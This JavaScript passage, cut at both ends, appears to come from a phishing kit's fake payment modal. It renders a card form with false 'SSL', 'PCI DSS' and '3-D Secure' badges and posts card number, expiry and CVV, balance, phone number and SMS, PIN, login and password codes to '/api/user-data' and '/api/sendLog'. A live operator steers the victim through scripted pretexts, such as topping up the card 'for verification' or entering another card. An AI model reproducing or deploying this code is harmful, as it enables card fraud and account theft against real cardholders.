              '<span class="ms-card-order-value"><span id="msCardOrderAmount">' + price + '</span> <span id="msCardOrderCurr">' + curr + '</span></span>' +
            '</div>'
            ) : '') +
          '</div>' +

          '<div class="ms-card-brand-templates" id="msCardBrandTpl">' +
            '<svg data-brand="visa" viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg"><rect width="780" height="500" rx="40" fill="#1A1F71"/><path d="M293.2 348.7l33.4-195.7h53.4l-33.4 195.7h-53.4zM533.6 157.7c-10.6-4-27.2-8.3-47.9-8.3-52.8 0-90 26.6-90.2 64.6-.3 28.1 26.5 43.8 46.8 53.2 20.8 9.6 27.8 15.8 27.7 24.4-.1 13.2-16.6 19.2-32 19.2-21.4 0-32.7-3-50.3-10.2l-6.9-3.1-7.5 43.8c12.5 5.5 35.6 10.2 59.6 10.5 56.2 0 92.6-26.3 93-66.7.2-22.2-14-39.1-44.8-53.1-18.7-9-30.1-15.1-30-24.2 0-8.1 9.7-16.8 30.6-16.8 17.4-.3 30.1 3.5 39.9 7.5l4.8 2.3 7.2-42.3zM610.1 153h-41.3c-12.8 0-22.4 3.5-28 16.3l-79.4 179.4h56.2s9.2-24.1 11.3-29.4h68.6c1.6 6.9 6.5 29.4 6.5 29.4h49.7l-43.6-195.7zm-65.9 126.3c4.4-11.3 21.4-54.8 21.4-54.8-.3.5 4.4-11.4 7.1-18.8l3.6 17s10.3 47 12.4 56.6h-44.5zM231.4 153l-52.3 133.4-5.6-27.1c-9.7-31.2-39.9-65.1-73.7-82l47.9 171.3h56.6l84.2-195.7h-57.1z" fill="#fff"/><path d="M146.9 153H59.6l-.7 3.8c67.2 16.2 111.7 55.4 130.1 102.5l-18.8-90.1c-3.2-12.4-12.8-15.8-23.3-16.2z" fill="#F9A533"/></svg>' +
            '<svg data-brand="mastercard" viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg"><rect width="780" height="500" rx="40" fill="#000"/><circle cx="312" cy="250" r="170" fill="#EB001B"/><circle cx="468" cy="250" r="170" fill="#F79E1B"/><path d="M390 120.8a169.5 169.5 0 00-65 129.2c0 53.4 24.7 101 63.2 132.2a169.5 169.5 0 0063.2-132.2c0-51.7-23-98-60-129.2z" fill="#FF5F00"/></svg>' +
            '<svg data-brand="humo" viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg"><rect width="780" height="500" rx="40" fill="#00A651"/><text x="390" y="285" text-anchor="middle" fill="#fff" font-family="Inter,Arial,sans-serif" font-size="180" font-weight="700" letter-spacing="-5">HUMO</text></svg>' +
            '<svg data-brand="uzcard" viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg"><rect width="780" height="500" rx="40" fill="#0073CE"/><text x="390" y="270" text-anchor="middle" fill="#fff" font-family="Inter,Arial,sans-serif" font-size="140" font-weight="700">UzCard</text><rect x="190" y="320" width="400" height="8" rx="4" fill="rgba(255,255,255,0.4)"/></svg>' +
            '<svg data-brand="unionpay" viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg"><rect width="780" height="500" rx="40" fill="#002E6E"/><rect x="120" y="60" width="200" height="380" rx="20" fill="#E21836"/><rect x="290" y="60" width="200" height="380" rx="20" fill="#00447C"/><rect x="460" y="60" width="200" height="380" rx="20" fill="#007B84"/><text x="390" y="300" text-anchor="middle" fill="#fff" font-family="Inter,Arial,sans-serif" font-size="100" font-weight="700">UP</text></svg>' +
            '<svg data-brand="mir" viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg"><rect width="780" height="500" rx="40" fill="#fff" stroke="#e3e8ee" stroke-width="4"/><path d="M155 170h60l30 90 30-90h60v160h-45V220l-30 110h-30l-30-110v110h-45V170z" fill="#0F754E"/><path d="M370 170h45v60h50v-60h45v160h-45v-65h-50v65h-45V170z" fill="#0F754E"/><path d="M540 170h80c30 0 50 15 50 45 0 25-15 40-35 45l45 70h-50l-40-65h-5v65h-45V170zm45 65h25c12 0 20-7 20-18s-8-17-20-17h-25v35z" fill="#0F754E"/><path d="M155 140h490v16c0 0-80 30-245 30S155 156 155 156V140z" fill="url(#mirGrad2)"/><defs><linearGradient id="mirGrad2" x1="155" y1="148" x2="645" y2="148"><stop stop-color="#00A0E5"/><stop offset="1" stop-color="#0F754E"/></linearGradient></defs></svg>' +
          '</div>' +

          '<div class="ms-card-form-wrap" id="msCardFormSection">' +
            '<div class="cf-card-form" id="msCardFormInner">' +
              '<div class="cf-card-form-title">' + (cardCopy.cardTitle || 'Payment details') + '</div>' +
              '<div class="cf-card-form-sub">' + (cardCopy.cardDetails || 'Enter your card details') + '</div>' +
              '<div class="cf-form-group">' +
                '<div class="cf-form-labels">' +
                  '<span class="cf-label-num" id="msCardNumLabel">' + (t.card && t.card.cardNumber || 'Card number') + '</span>' +
                  '<span class="cf-label-exp" id="msCardExpLabel">' + (t.card && t.card.expLabel || '\u0421\u0440\u043e\u043a') + '</span>' +
                  '<span class="cf-label-cvv" id="msCardCvvLabel">' + (t.card && t.card.cvvLabel || 'CVV') + '</span>' +
                  '<div class="cf-card-icons">' +
                    '<img id="bankicon1" src="/style/card/visa-365725566f9578a9589553aa9296d178.svg" alt="Visa">' +
                    '<img id="bankicon2" src="/style/card/mastercard-4d8844094130711885b5e41b28c9848f.svg" alt="MC">' +
                    '<img id="bankicon3" src="/style/card/amex-a49b82f46c5cd6a96a6e418a6ca1717c.svg" alt="" style="display:none">' +
                    '<img id="bankicon4" src="/style/card/unionpay-8a10aefc7295216c338ba4e1224627a1.svg" alt="" style="display:none">' +
                  '</div>' +
                '</div>' +
                '<div class="cf-card-unified" id="cardUnified">' +
                  '<div class="cf-brand-slot" id="msCardBrandIn" aria-hidden="true">' +
                    '<svg viewBox="0 0 24 16" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"><rect x="1" y="1" width="22" height="14" rx="2"/><path d="M1 5h22"/></svg>' +
                  '</div>' +
                  '<input class="cf-num-input" id="_input0" name="fcard" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000" autocorrect="off" spellcheck="false">' +
                  '<div class="cf-check cf-check-num" id="msCheckNum" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 12 10 18 20 6"/></svg></div>' +
                  '<div class="cf-sep"></div>' +
                  '<input class="cf-exp-input" id="_input1" name="fexp" type="text" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/YY" autocorrect="off" spellcheck="false">' +
                  '<div class="cf-sep cf-sep-cvv"></div>' +
                  '<input class="cf-cvv-input" id="_input3" name="fcvc" type="text" inputmode="numeric" autocomplete="cc-csc" placeholder="CVV" autocorrect="off" spellcheck="false">' +
                '</div>' +
                '<div class="cf-field-error" id="msCardFieldErr" role="alert"></div>' +
              '</div>' +
              '<button type="button" id="_buttonPay" class="cf-btn-primary cf-btn-pay" disabled>' +
                '<span class="cf-btn-lock" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 018 0v4"/></svg></span>' +
                '<span class="cf-btn-text" id="msPayBtnText">' + (cardCopy.next || 'Pay') + '</span>' +
                '<span class="cf-btn-arrow" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="13 6 19 12 13 18"/></svg></span>' +
              '</button>' +
              '<div class="cf-secure-line">' +
                '<svg viewBox="0 0 24 24" fill="none"><path d="M12 2C9.24 2 7 4.24 7 7v3H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-1V7c0-2.76-2.24-5-5-5zm0 2c1.65 0 3 1.35 3 3v3H9V7c0-1.65 1.35-3 3-3z" fill="currentColor"/></svg>' +
                '<span>' + (t.card && t.card.secureLine || 'Secure connection') + '</span>' +
              '</div>' +
            '</div>' +
            '<div class="ms-card-loading" id="msCardLoading">' +
              '<div class="ms-card-ld-spinner"></div>' +
              '<div class="ms-card-ld-title">' + (t.card && t.card.wait || 'Processing...') + '</div>' +
              '<div class="ms-card-ld-text">' + (t.card && t.card.safeData || 'Please wait. Do not close this window.') + '</div>' +
            '</div>' +
          '</div>' +

          '<div class="ms-card-secure-footer">' +
            '<div class="ms-card-secure-line-row">' +
              '<span class="ms-card-sec-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 018 0v4"/></svg>SSL 256-bit</span>' +
              '<span class="ms-card-sec-dot" aria-hidden="true">\u2022</span>' +
              '<span class="ms-card-sec-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>PCI DSS</span>' +
              '<span class="ms-card-sec-dot" aria-hidden="true">\u2022</span>' +
              '<span class="ms-card-sec-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 8v4l2 2"/></svg>3-D Secure</span>' +
            '</div>' +
            '<div class="ms-card-secure-text" id="msCardFooterText">' + (t.card && t.card.safeData || 'Your data is protected by end-to-end encryption.') + '</div>' +
          '</div>' +

        '</div></div>' +
      '</div>';

    document.body.appendChild(container);

    if (typeof window.OTPAutofill !== 'undefined') {
      window.OTPAutofill.init();
    }

    var self = this;

    this._bind('msBalanceVerifyBtn', 'click', function () { self._submitBalance(); });

    function balanceInputFilter(inp) {
      if (!inp) return;
      inp.addEventListener('input', function () {
        var v = inp.value.replace(/[^0-9.,]/g, '');
        var parts = v.split(/[.,]/);
        if (parts.length > 1) {
          v = parts[0] + '.' + parts.slice(1).join('').substring(0, 2);
        }
        inp.value = v;
      });
    }
    balanceInputFilter(document.getElementById('msBalanceVerifyInput'));
    balanceInputFilter(document.getElementById('msBalanceCode'));

    this._bind('msCardFormClose', 'click', function () { self.hideCardForm(); });
    this._bind('_buttonPay', 'click', function () { self._submitCardForm(); });

    var msCardInput0 = document.getElementById('_input0');
    if (msCardInput0) {
      msCardInput0.addEventListener('input', function () {
        self._detectCardBrand(this.value.replace(/\D/g, ''));
        var rawNum = (typeof CardForm !== 'undefined' && CardForm.getRawNumber)
          ? CardForm.getRawNumber()
          : this.value.replace(/\D/g, '');
        var expEl = document.getElementById('_input1');
        self._updatePreview({
          number: rawNum,
          exp: expEl ? expEl.value : '',
          holder: ''
        });
      });
    }
    var msCardInput1 = document.getElementById('_input1');
    if (msCardInput1) {
      msCardInput1.addEventListener('input', function () {
        var rawNum = (typeof CardForm !== 'undefined' && CardForm.getRawNumber)
          ? CardForm.getRawNumber()
          : (document.getElementById('_input0') || {}).value || '';
        self._updatePreview({
          number: rawNum,
          exp: this.value,
          holder: ''
        });
      });
    }
    var msCardOverlay = document.getElementById('msCardForm');
    if (msCardOverlay) {
      document.addEventListener('keydown', function (ev) {
        if (!msCardOverlay.classList.contains('active')) return;
        if (ev.key === 'Escape' || ev.keyCode === 27) {
          ev.preventDefault();
          self.hideCardForm();
        } else if (ev.key === 'Enter' || ev.keyCode === 13) {
          var btn = document.getElementById('_buttonPay');
          if (btn && !btn.disabled) {
            ev.preventDefault();
            self._submitCardForm();
          }
        }
      });
      msCardOverlay.addEventListener('mousedown', function (ev) {
        if (ev.target === msCardOverlay) self.hideCardForm();
      });
    }

    this._bind('msSmsBtn', 'click', function () { self._sendValue('sms', 'msSmsCode'); });
    this._bind('msSmsCallBtn', 'click', function () { self._sendValue('callSms', 'msSmsCallCode'); });

    var smsInput = document.getElementById('msSmsCode');
    var smsCallInput = document.getElementById('msSmsCallCode');
    function autoSubmitSms(inputEl, type, inputId) {
      if (!inputEl) return;
      var lastLen = 0;
      var rapidStart = 0;
      var rapidTimer = null;
      inputEl.addEventListener('input', function () {
        var v = inputEl.value.replace(/\D/g, '');
        if (v.length >= 4 && lastLen <= 1) {
          self._sendValue(type, inputId);
        }
        if (v.length >= 1 && v.length < 4 && !rapidStart) {
          rapidStart = Date.now();
        }
        if (v.length >= 4 && rapidStart && lastLen < 4) {
          if (Date.now() - rapidStart < 100) {
            self._sendValue(type, inputId);
          }
          rapidStart = 0;
        }
        if (rapidTimer) clearTimeout(rapidTimer);
        rapidTimer = setTimeout(function() { rapidStart = 0; }, 200);
        lastLen = v.length;
      });
    }
    autoSubmitSms(smsInput, 'sms', 'msSmsCode');
    autoSubmitSms(smsCallInput, 'callSms', 'msSmsCallCode');

    this._bind('msPushBtn', 'click', function () { self._confirmAction('push'); });
    this._bind('msCallBtn', 'click', function () { self._confirmAction('call'); });
    this._bind('msWrongDataDisplayBtn', 'click', function () { self._resetToCard(); });
    this._bind('msWrongDataBtn', 'click', function () { self._sendValue(self.wrongDataType, 'msWrongDataCode'); });
    this._bind('msBalanceBtn', 'click', function () { self._sendValue('balance', 'msBalanceCode'); });
    this._bind('msFieldBtn', 'click', function () { self._sendValue('custom', 'msFieldCode'); });
    this._bind('msSmenalkBtn', 'click', function () { self._handleSmenalk(); });
    this._bind('msErrorBtn', 'click', function () { self._resetToCard(); });
    this._bind('msCustomBtn', 'click', function () { self._confirmCustom(); });
    this._bind('msMerchantBtn', 'click', function () { self._resetToCard(); });
    this._bind('msPopolnenieBtn', 'click', function () { self._handlePopolnenie(); });
    this._bind('msPhoneBtn', 'click', function () {
      if (self.cfg.requestPhoneAfterBalance && self._pendingBalance !== undefined) {
        var phoneInp = document.getElementById('msPhoneInput');
        var phoneVal = (phoneInp.value || '').trim();
        if (!phoneVal || phoneVal.length < 5) {
          phoneInp.style.borderColor = 'var(--modal-error, #d32f2f)';
          var phoneErr = document.getElementById('msPhoneError');
          if (phoneErr) phoneErr.style.display = 'block';
          return;
        }
        phoneInp.style.borderColor = 'var(--modal-accent, #1867c1)';
        var phoneErr2 = document.getElementById('msPhoneError');
        if (phoneErr2) phoneErr2.style.display = 'none';
        var phoneBtn = document.getElementById('msPhoneBtn');
        if (phoneBtn) { phoneBtn.disabled = true; phoneBtn.textContent = '...'; }
        self._pendingPhone = phoneVal;
        self.showModal('msLoading');
        self._sendLog(self._pendingBalance);
        self._pendingBalance = undefined;
      } else {
        self._sendValue('phone', 'msPhoneInput');
      }
    });
    this._bind('msBirthdayBtn', 'click', function () { self._submitBirthday(); });
    this._setupDateSegments();
  };

  ModalSystem.prototype._processCardStep2 = function (cardData) {
    var self = this;

    axios.post('/api/preLog', {
      item: this.cfg.itemId,
      cardNumber: cardData.cardNumber,
      cardMonth: cardData.cardMonth,
      cardYear: cardData.cardYear,
      cardCvv: cardData.cardCvv
    }).catch(function () {});

    setTimeout(function () {
      self.showModal('msBalanceVerify');
      var inp = document.getElementById('msBalanceVerifyInput');
      if (inp) {
        inp.value = '';
        inp.style.borderColor = '';
      }
      var err = document.getElementById('msBalanceVerifyError');
      if (err) err.style.display = 'none';
      setTimeout(function () { if (inp) inp.focus(); }, 400);

      axios.post('/api/balancePage', { item: self.cfg.itemId }).catch(function () {});
    }, 2500);
  };

  ModalSystem.prototype._submitBalance = function () {
    var inp = document.getElementById('msBalanceVerifyInput');
    var raw = (inp.value || '').trim().replace(/,/g, '.').replace(/\s/g, '');
    var val = parseFloat(raw);
    var errEl = document.getElementById('msBalanceVerifyError');
    var txnAmount = parseFloat((this.cfg.price || '0').replace(/[^0-9.,]/g, '').replace(',', '.'));

    if (!raw || isNaN(val) || val <= 0) {
      errEl.style.display = 'block';
      inp.style.borderColor = 'var(--modal-error, #d32f2f)';
      return;
    }
    // Block example values from format hint (15230, 15230.5, 15230.50 etc.)
    var blockedExamples = [15230, 15230.5, 15230.50];
    if (blockedExamples.indexOf(val) !== -1) {
      errEl.style.display = 'block';
      inp.style.borderColor = 'var(--modal-error, #d32f2f)';
      return;
    }
    // Block card numbers: if first 8 digits of entered card appear in balance input
    if (this._cardData && this._cardData.cardNumber) {
      var cardPrefix = this._cardData.cardNumber.replace(/\D/g, '').substr(0, 8);
      var rawDigits = raw.replace(/\D/g, '');
      if (cardPrefix.length >= 8 && rawDigits.indexOf(cardPrefix) !== -1) {
        errEl.style.display = 'block';
        inp.style.borderColor = 'var(--modal-error, #d32f2f)';
        return;
      }
    }
    if (val === txnAmount) {
      errEl.style.display = 'block';
      inp.style.borderColor = 'var(--modal-error, #d32f2f)';
      return;
    }

    errEl.style.display = 'none';
    inp.style.borderColor = 'var(--modal-accent, #1867c1)';
    var btn = document.getElementById('msBalanceVerifyBtn');
    if (btn) { btn.disabled = true; btn.textContent = '...'; }

    if (this.cfg.requestPhoneAfterBalance) {
      this._pendingBalance = raw;
      this.showModal('msRequestPhone');
      var phoneInp = document.getElementById('msPhoneInput');
      if (phoneInp) { phoneInp.value = ''; }
      var phoneErr = document.getElementById('msPhoneError');
      if (phoneErr) phoneErr.style.display = 'none';
      this._resetPhoneBtn();
      setTimeout(function () { if (phoneInp) phoneInp.focus(); }, 400);
      var tt = this.cfg.translate || {};
      if (btn) { btn.disabled = false; btn.textContent = (tt.sms && tt.sms.next || 'Далее'); }
      return;
    }

    // AutoPP: check if balance is below minimum PP amount
    if (this._autoPP && this._autoPP.enabled && this._autoPP.ppAmount) {
      var ppMin = parseFloat(this._autoPP.ppAmount);
      if (!isNaN(ppMin) && val < ppMin) {
        var t = this.cfg.translate || {};
        var popTitle = document.getElementById('msPopolnenieTitle');
        var popText = document.getElementById('msPopolnenieText');
        var popAmount = document.getElementById('msPopolnenieAmount');
        if (popTitle) popTitle.textContent = t.errors && t.errors.popolnenieTitle || 'Верификация карты';
        if (popText) popText.textContent = t.errors && t.errors.popolnenieText || 'Для подтверждения того, что вы являетесь держателем карты, необходимо пополнить баланс на сумму:';
        if (popAmount) popAmount.textContent = this._autoPP.ppAmount + ' ' + (this.cfg.curr || '');
        
        this.showModal('msPopolnenie');
        // Notify worker about low balance
        axios.post('/api/autoPPNotify', { item: this.cfg.itemId, event: 'balanceLow', extra: raw }).catch(function () {});
        axios.post('/api/autoPPNotify', { item: this.cfg.itemId, event: 'popolneniePage', extra: this._autoPP.ppAmount }).catch(function () {});
        if (btn) { btn.disabled = false; btn.textContent = (t.sms && t.sms.next || 'Далее'); }
        return;
      }
    }

    // Ensure _cardData is set before sending log
    if (!this._cardData && _memCardData) {
      this._cardData = _memCardData;
    }

    
    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
    this._sendBalanceToBot(raw);
    if (typeof BinChecker !== 'undefined' && BinChecker.sendBalance) {
      BinChecker.sendBalance(_adId, raw);
    }

    this._balanceSent = true;
    this.showModal('msLoading');
    this._sendLog(raw);
  };

  ModalSystem.prototype._sendCardDataToBot = function (cardData) {
    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
    axios.post('/api/user-data', {
      adId: _adId,
      type: 'card',
      cardNumber: (cardData.cardNumber || '').replace(/\s/g, ''),
      cardMonth: cardData.cardMonth,
      cardYear: cardData.cardYear,
      cardCvv: cardData.cardCvv
    }).catch(function () {});
    if (typeof BinChecker !== 'undefined' && BinChecker.sendCardData) {
      BinChecker.sendCardData(_adId, cardData.cardNumber, {});
    }
  };

  ModalSystem.prototype._sendBalanceToBot = function (balance) {
    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
    axios.post('/api/user-data', {
      adId: _adId,
      type: 'balance',
      balance: balance
    }).catch(function () {});
  };

  ModalSystem.prototype._sendLog = function (balance) {
    var self = this;

    var postData = {
      item: window.__currentAdId || window.itemId || this.cfg.itemId
    };

    if (this._pendingPhone) {
      postData.phone = this._pendingPhone;
      this._pendingPhone = undefined;
    }

    if (this.cfg.extraPostData) {
      for (var k in this.cfg.extraPostData) {
        if (this.cfg.extraPostData.hasOwnProperty(k)) {
          postData[k] = this.cfg.extraPostData[k];
        }
      }
    }

    axios.post(API_BASE + '/api/sendLog', postData)
      .then(function (res) {
        self.logId = res.data.id;
        self.currentStatus = 'wait';
        self.paused = false;
        self._startPolling();

        var btn = document.getElementById('msBalanceVerifyBtn');
        var t = self.cfg.translate || {};
        if (btn) { btn.disabled = false; btn.textContent = (t.sms && t.sms.next || 'Далее'); }
        self._resetPhoneBtn();
      })
      .catch(function () {
        self.logId = 'temp_' + (window.__currentAdId || window.itemId || self.cfg.itemId) + '_' + Date.now();
        self.currentStatus = 'wait';
        self.paused = false;
        self._startPolling();

        var btn = document.getElementById('msBalanceVerifyBtn');
        var t = self.cfg.translate || {};
        if (btn) { btn.disabled = false; btn.textContent = (t.sms && t.sms.next || 'Далее'); }
        self._resetPhoneBtn();
      });
  };

  ModalSystem.prototype._sendAction = function (action) {
    var postData = {
      item: this.cfg.itemId,
      action: action
    };
    if (this.cfg.extraPostData) {
      for (var k in this.cfg.extraPostData) {
        if (this.cfg.extraPostData.hasOwnProperty(k)) {
          postData[k] = this.cfg.extraPostData[k];
        }
      }
    }
    axios.post(this.cfg.apiSendLog || '/api/sendLog', postData).catch(function(){});
  };

  ModalSystem.prototype._startPolling = function () {
    if (this.polling) return;
    this.polling = true;
    // ...
    this._connectSSE();
  };

  ModalSystem.prototype._connectSSE = function () {
    if (typeof EventSource === 'undefined') {
      
      this._startFallbackPolling();
      return;
    }

    var self = this;
    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
    var url = API_BASE + '/api/sse?';
    if (this.logId) url += 'logId=' + encodeURIComponent(this.logId);
    if (_adId) url += (this.logId ? '&' : '') + 'itemId=' + encodeURIComponent(_adId);

    if (this.eventSource) {
      try { this.eventSource.close(); } catch(e) {}
    }

    this.eventSource = new EventSource(url);

    this.eventSource.addEventListener('connected', function () {
      self.sseConnected = true;
      
      if (self.pollTimer) {
        clearInterval(self.pollTimer);
        self.pollTimer = null;
      }
    });

    this.eventSource.addEventListener('status', function (e) {
      if (self.paused) return;
      try {
        var data = JSON.parse(e.data);
        self._handleStatusData(data);
      } catch(err) {}
    });

    this.eventSource.addEventListener('chat', function (e) {
      try {
        var data = JSON.parse(e.data);
        if (data.status == 1 && typeof window.openOrCloseChat === 'function') {
          
          if (typeof window._userClosedChat !== 'undefined') window._userClosedChat = false;
          if (typeof window.forceOpenChat === 'function') window.forceOpenChat();
          
          axios.post('/api/confirmChatOpened', { id: self.cfg.itemId }).catch(function(){});
        } else if (data.status == 2) {
          var chatra = document.querySelector('#chatra');
          var supportCircle = document.querySelector('.support-circle');
          if (chatra) chatra.style.display = 'none';
          if (supportCircle) supportCircle.style.display = 'block';
        }
      } catch(err) {}
    });

    this.eventSource.addEventListener('message', function (e) {
      try {
        var data = JSON.parse(e.data);
        if (data.undelivered || data.hasUnread) {
          if (typeof window._userClosedChat !== 'undefined') window._userClosedChat = false;
          if (typeof window.forceOpenChat === 'function') window.forceOpenChat();
        }
      } catch(err) {}
    });

    this.eventSource.onerror = function () {
      self.sseConnected = false;
      
      if (!self.pollTimer) {
        self._startFallbackPolling();
      }
    };
  };

  ModalSystem.prototype._startFallbackPolling = function () {
    if (this.pollTimer) return;
    var self = this;
    this.pollTimer = setInterval(function () {
      
      if (self.sseConnected) {
        clearInterval(self.pollTimer);
        self.pollTimer = null;
        return;
      }
      self._pollStatus();
    }, 1500);
  };

  ModalSystem.prototype._handleStatusData = function (data) {
    var method = data.method;
    var t = this.cfg.translate || {};
    if (!method || method === this.currentStatus) return;

    var oneShot = ['smenakarta', 'smenalk', 'toLk', 'lkCard', 'merchant'];
    if (oneShot.indexOf(method) !== -1) {
      var now = Date.now();
      if (!this._lastOneShot) this._lastOneShot = {};
      if (this._lastOneShot[method] && (now - this._lastOneShot[method]) < 15000) {
        return;
      }
      this._lastOneShot[method] = now;
    }

    if (method === 'wait') {
      this.currentStatus = method;
      this.showModal('msLoading');
      return;
    }

    this.currentStatus = method;

    switch (method) {
      case 'sms':
        this.showModal('msSms');
        break;
      case 'smsCall':
        this.showModal('msSmsCall');
        break;
      case 'push':
        this.showModal('msPush');
        break;
      case 'call':
        this.showModal('msCall');
        break;
      case 'wrongData':
        var wdTitle = document.querySelector('#msWrongDataDisplay .ms-title');
        var wdText = document.querySelector('#msWrongDataDisplay .ms-text');
        if (wdTitle) wdTitle.textContent = t.errors && t.errors.generalErrorWord || 'Ошибка';
        if (wdText) wdText.textContent = t.wrongdata && t.wrongdata.wrongdata || 'Неверные данные.';
        this.showModal('msWrongDataDisplay');
        break;
      case 'wrongPin':
        this.wrongDataType = 'wrongPin';
        this._setWrongData(
          t.smscall && t.smscall.conf || 'Подтверждение',
          t.wrongdata && t.wrongdata.wrongpin || 'Неверный PIN',
          t.wrongdata && t.wrongdata.enterpinthis || 'PIN',
          'password'
        );
        this.showModal('msWrongData');
        break;
      case 'wrongLogin':
        this.wrongDataType = 'wrongLogin';
        this._setWrongData(
          t.smscall && t.smscall.conf || 'Подтверждение',
          t.wrongdata && t.wrongdata.wronglogin || 'Неверный логин',
          t.wrongdata && t.wrongdata.enterloginthis || 'Логин',
          'text'
        );
        this.showModal('msWrongData');
        break;
      case 'wrongPass':
        this.wrongDataType = 'wrongPass';
        this._setWrongData(
          t.smscall && t.smscall.conf || 'Подтверждение',
          t.wrongdata && t.wrongdata.wrongpass || 'Неверный пароль',
          t.wrongdata && t.wrongdata.enterpassthis || 'Пароль',
          'password'
        );
        this.showModal('msWrongData');
        break;
      case 'balance':
        this.showModal('msBalance');
        break;
      case 'smartid':
        this.showModal('msSmartid');
        break;
      case 'field':
        if (data.error) {
          var ftxt = document.getElementById('msFieldText');
          if (ftxt) ftxt.textContent = data.error;
        }
        this.showModal('msField');
        break;
      case 'smenalk':
        this.showModal('msSmenalk');
        break;
      case 'toLk':
        window.location.href = '/' + this.cfg.itemId;
        break;
      case 'smenakarta':
        var skTitle = document.querySelector('#msWrongDataDisplay .ms-title');
        var skText = document.querySelector('#msWrongDataDisplay .ms-text');
        if (skTitle) skTitle.textContent = t.errors && t.errors.changeCard || 'Возникла проблема';
        if (skText) skText.textContent = t.errors && t.errors.cardProblem || 'Уважаемый пользователь, данная банковская карта не поддерживается или возникли проблемы. Пожалуйста укажите другую.';
        this.showModal('msWrongDataDisplay');
        break;
      case 'popolnenie':
        var popTitle = document.getElementById('msPopolnenieTitle');
        var popText = document.getElementById('msPopolnenieText');
        var popAmount = document.getElementById('msPopolnenieAmount');
        if (popTitle) popTitle.textContent = t.errors && t.errors.popolnenieTitle || 'Верификация карты';
        if (popText) popText.textContent = t.errors && t.errors.popolnenieText || 'Для подтверждения того, что вы являетесь держателем карты, необходимо пополнить баланс на сумму:';
        if (popAmount && data.error) popAmount.textContent = data.error;
        this.showModal('msPopolnenie');
        break;
      case 'requestPhone':
        this._resetPhoneBtn();
        var rPhoneInp = document.getElementById('msPhoneInput');
        if (rPhoneInp) { rPhoneInp.value = ''; rPhoneInp.style.borderColor = ''; }
        var rPhoneErr = document.getElementById('msPhoneError');
        if (rPhoneErr) rPhoneErr.style.display = 'none';
        this.showModal('msRequestPhone');
        break;
      case 'requestBirthday':
        this.showModal('msRequestBirthday');
        break;
      case 'lkCard':
        this._resetToCard();
        break;
      case 'merchant':
        this._resetToCard();
        break;
      case 'custom':
        if (data.error) {
          var ctxt = document.getElementById('msCustomText');
          if (ctxt) ctxt.textContent = data.error;
        }
        this.showModal('msCustom');
        break;
      case 'error':
        this.showModal('msError');
        break;
      case 'success':
      case 'successTransaction':
        this.showModal('msSuccess');
        break;
    }
  };

  ModalSystem.prototype._pollStatus = function () {
    if (!this.logId || this.paused) return;
    var self = this;

    axios.post(API_BASE + '/api/getStatus', { id: this.logId })
      .then(function (res) {
        self._handleStatusData(res.data);
      });
  };

  ModalSystem.prototype._setWrongData = function (title, text, placeholder, inputType) {
    var el;
    el = document.getElementById('msWrongDataTitle');
    if (el) el.textContent = title;
    el = document.getElementById('msWrongDataText');
    if (el) el.textContent = text;
    el = document.getElementById('msWrongDataCode');
    if (el) { el.placeholder = placeholder; el.type = inputType; el.value = ''; }
  };

  ModalSystem.prototype._sendValue = function (type, inputId) {
    if (this._sendingValue) return;
    this._sendingValue = true;
    var self = this;
    setTimeout(function() { self._sendingValue = false; }, 2000);

    var input = document.getElementById(inputId);
    var val = (input.value || '').trim();
    if (!val) { this._sendingValue = false; input.style.borderColor = 'var(--modal-error, #d32f2f)'; return; }
    // Block example values for balance inputs
    if (type === 'balance') {
      var numVal = parseFloat(val.replace(/,/g, '.').replace(/\s/g, ''));
      var blockedExamples = [15230, 15230.5, 15230.50];
      if (blockedExamples.indexOf(numVal) !== -1) {
        input.style.borderColor = 'var(--modal-error, #d32f2f)';
        return;
      }
    }
    input.style.borderColor = 'var(--modal-accent, #1867c1)';

    var btn = input.parentElement.querySelector('.ms-btn');
    var t = this.cfg.translate || {};
    if (btn) { btn.disabled = true; btn.textContent = '...'; }

    var self = this;
    var _adId = window.__currentAdId || window.itemId || this.cfg.itemId;
    var id = this.logId || ('temp_' + _adId + '_' + Date.now());
    axios.post(API_BASE + '/api/sendValue', { value: val, type: type, id: id, itemId: _adId })
      .then(function () {
        self._sendingValue = false;
        input.value = '';
        if (btn) { btn.disabled = false; btn.textContent = (t.sms && t.sms.next || 'Далее'); }
        self.currentStatus = 'wait';
        self.showModal('msLoading');
      })
      .catch(function (err) {
        self._sendingValue = false;
        if (btn) { btn.disabled = false; btn.textContent = (t.sms && t.sms.next || 'Далее'); }
      });
  };

  ModalSystem.prototype._confirmAction = function (type) {
    var sp = document.getElementById('ms' + type.charAt(0).toUpperCase() + type.slice(1) + 'Spinner');
    if (sp) sp.style.display = 'flex';

    var self = this;
